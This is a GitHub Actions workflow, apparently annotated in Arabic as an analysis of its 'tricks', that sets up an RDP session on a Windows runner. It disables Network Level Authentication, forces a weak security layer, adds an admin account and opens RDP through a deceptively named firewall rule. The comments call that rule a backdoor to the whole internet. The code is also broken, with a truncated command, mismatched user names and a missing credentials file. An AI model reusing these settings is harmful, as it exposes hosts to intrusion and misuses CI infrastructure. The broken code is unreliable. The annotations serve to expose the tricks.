name: Debug RDP Session

on:
  workflow_dispatch: # للتشغيل اليدوي

jobs:
  debug-rdp:
    runs-on: windows-latest
    timeout-minutes: 36000 # حد أقصى 60 دقيقة

    steps:
      - name: Configure Core RDP Settings
        run: |
       
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          
          # الخدعة رقم 3: تعطيل ميزة أمان أساسية (NLA)
          # هذا السطر يعطل "مصادقة مستوى الشبكة" (NLA).
          # NLA هي ميزة تطلب المصادقة *قبل* إنشاء جلسة RDP كاملة.
          # بتعطيلها، هو يسهل على نفسه الاتصال بأدوات قديمة وغير آمنة
          # ويجعل الخادم عرضة لهجمات القوة الغاشمة (Brute-force) بشكل أسهل.
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force

          # الخدعة رقم 4: فرض طبقة أمان ضعيفة جداً
          # هذا السطر يجبر RDP على استخدام "طبقة أمان RDP" (قيمة 0).
          # هذا هو أضعف بروتوكول، وقد يكون غير مشفر.
          # هذا يسهل على المهاجم اعتراض الاتصال (Man-in-the-Middle) إذا أراد.
          # هو لا يهتم بأمان الاتصال، هو يهتم فقط بأن "يعمل" الاتصال.
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force

          # ... (هذا السطر يحذف قاعدة قديمة، ليس خبيثاً بحد ذاته)
          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          
          # الخدعة رقم 5: الباب الخلفي المفتوح للإنترنت (الثغرة الأخطر)
          # هذا هو السطر الكارثي.
          # تم تسمية القاعدة "RDP-Tailscale" لتبدو وكأنها خاصة بـ Tailscale.
          # لكنها في الحقيقة تفتح منفذ RDP (3389) **لكل الإنترنت** (Any IP).
          # المهاجم الآن لديه "باب خلفي" عام للوصول للخادم.
          netsh advfirewall firewall add rule name="RDP-Tailscale" `
          

          Restart-Service -Name TermService -Force
        
     - name: Create RDP User with Secure Password
        run: |
        
          Add-Type -AssemblyName System.Security
          $charSet = @{
              Upper   = [char[]](65..90)
              Lower   = [char[]](97..122)
              Number  = [char[]](48..57)
              Special = ([char[]](33..47) + [char[]](58..64) +
                         [char[]](91..96) + [char[]](123..126))
          }
          $rawPassword = @()
          $rawPassword += $charSet.Upper | Get-Random -Count 4
          $rawPassword += $charSet.Lower | Get-Random -Count 4
          $rawPassword += $charSet.Number | Get-Random -Count 4
          $rawPassword += $charSet.Special | Get-Random -Count 4
          $password = -join ($rawPassword | Sort-Object { Get-Random })
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          
          New-LocalUser -Name "runner-admin" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "runner-admin"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "runner-admin"
          
        
          
          if (-not (Get-LocalUser -Name "RDP")) {
              Write-Error "User creation failed"
              exit 1
          }

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force
      - name: Upload Credentials as Secure Artifact
        uses: actions/upload-artifact@v4
        with:
          name: rdp-credentials
          path: rdp-credentials.txt

        - name: Verify RDP Accessibility
        # ... (هذه الخطوة مجرد "عرض" لإظهار أن الكود احترافي ويتحقق من عمله)
        run: |
          # ...

      

      - name: Keep Runner Alive for Debugging
        run: |
       
          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
          }
